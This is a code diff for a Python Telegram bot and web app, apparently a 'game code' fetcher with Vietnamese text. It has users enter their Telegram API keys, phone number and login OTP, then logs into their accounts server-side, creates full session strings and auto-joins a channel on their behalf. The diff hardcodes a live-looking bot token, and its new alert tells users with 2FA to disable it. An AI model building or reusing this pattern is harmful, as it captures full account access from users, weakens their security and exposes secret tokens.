@@ -15,7 +15,7 @@ from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
 # ============ CONFIG ============
-BOT_TOKEN     = os.getenv("BOT_TOKEN", "8584201446:AAHAINg4IALEX1sJ-dmiinLsPLZ-u_S0nTc")
+BOT_TOKEN     = os.getenv("BOT_TOKEN", "8990113148:AAH1wgUusu_Z3AW2JNF4JwivXAvCDOFLO8U")
 PORT          = int(os.getenv("PORT", 10000))                    
 PING_INTERVAL = int(os.getenv("PING_INTERVAL", 5))               
 WEBAPP_URL    = os.getenv("WEBAPP_URL") or os.getenv("RENDER_EXTERNAL_URL", "")
@@ -73,7 +73,11 @@ def api_verify_code():
             try:
                 await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
             except SessionPasswordNeededError:
-                return {"status": "2fa", "message": "Tài khoản có bật 2FA. Vui lòng nhập mật khẩu."}
+                await client.disconnect()
+                return {"status": "2fa", "message": "Tài khoản có bật xác thực 2 lớp (2FA). Vui lòng nhập mật khẩu."}
+            except Exception as e:
+                await client.disconnect()
+                return {"status": "error", "message": "Mã OTP không đúng hoặc đã hết hạn."}
             
             new_session = client.session.save()
             await client.disconnect()
@@ -101,9 +105,9 @@ def api_get_codes():
                 channel = await client.get_entity('https://t.me/codelaucuagame')
                 await client(functions.channels.JoinChannelRequest(channel=channel))
             except Exception as e:
-                logger.warning(f"Join channel note: {e}")
+                logger.warning(f"Join channel note (có thể đã join): {e}")
 
-            # Get messages
+            # Get messages (Lấy 30 tin nhắn gần nhất để quét)
             messages = await client.get_messages('https://t.me/codelaucuagame', limit=30)
             codes = []
             
@@ -219,7 +223,6 @@ body>*{position:relative; z-index:1}
 .btn:active{transform: scale(0.97); box-shadow: none;}
 .btn:disabled {opacity: 0.6; pointer-events: none;}
 
-/* Code Result Box */
 .code-box { background: var(--bg); border: 1px solid var(--border); border-radius: 10px; padding: 12px 16px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; font-family: monospace; font-size: 15px; color: var(--accent2); font-weight: 700; letter-spacing: 1px;}
 .copy-btn { background: rgba(99, 102, 241, 0.1); border: none; color: var(--accent); padding: 8px 12px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px;}
 .copy-btn:active { background: var(--accent); color: #fff; }
@@ -306,7 +309,6 @@ body>*{position:relative; z-index:1}
 const tg = window.Telegram?.WebApp;
 if (tg) { tg.ready(); tg.expand(); }
 
-// Lưu trữ state tạm thời
 let authData = { api_id: '', api_hash: '', phone: '', phone_code_hash: '', session: '' };
 
 function showView(id) {
@@ -369,7 +371,7 @@ async function verifyCode() {
       authData.session = data.session;
       await fetchCodes(); // Tự động lấy code
     } else if (data.status === '2fa') {
-      alert("Tài khoản của bạn có bật 2FA. Tính năng nhập pass 2FA đang phát triển!");
+      alert("Tài khoản của bạn có bật 2FA. Vui lòng tắt 2FA hoặc dùng App khác!");
       btn.innerText = "Xác Nhận"; btn.disabled = false;
     } else {
       alert("Lỗi: " + data.message);
@@ -383,7 +385,6 @@ async function verifyCode() {
 
 async function fetchCodes() {
   try {
-    // Chuyển sang view kết quả và hiển thị loading
     showView('view-result');
     const container = document.getElementById('codes-container');
     container.innerHTML = '<div style="text-align:center; color:var(--muted)">Đang quét kênh và lấy code...</div>';
